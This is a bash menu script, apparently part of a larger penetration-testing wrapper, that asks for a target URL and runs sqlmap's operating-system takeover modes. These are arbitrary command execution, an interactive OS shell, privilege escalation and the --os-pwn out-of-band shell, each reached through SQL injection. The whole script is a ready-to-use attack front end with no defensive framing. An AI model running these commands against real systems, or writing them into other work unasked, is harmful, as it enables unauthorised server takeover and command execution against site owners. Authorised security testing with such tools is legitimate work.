#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
OS Access Query
OS Access Command

1. OS command
sqlmap -u [url] --os-cmd=[command] --batch
2. OS shell
sqlmap -u [url] --os-shell --batch
3. Privilege escalation
sqlmap -u [url] --priv-esc --batch
4. OS pwn
sqlmap -u [url] --os-pwn --batch
EOF

read -r -p $'\nSelect-Options>Sqlmap>OS-Access>' select

case "$select" in
  1)
    read -r -p "Input URL> " url
    read -r -p "Input command> " command
    run_sqlmap sqlmap -u "$url" --os-cmd="$command" --batch
    ;;
  2)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --os-shell --batch
    ;;
  3)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --priv-esc --batch
    ;;
  4)
    read -r -p "Input URL> " url
    run_sqlmap sqlmap -u "$url" --os-pwn --batch
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac
